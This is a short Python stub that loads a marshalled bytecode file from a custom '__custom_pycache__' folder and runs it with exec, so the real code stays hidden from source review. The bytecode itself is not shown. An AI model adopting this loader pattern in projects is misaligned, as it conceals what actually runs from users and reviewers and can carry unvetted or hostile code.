
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Ner_2fa876b56499467dbc7b8b33aa23352a.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
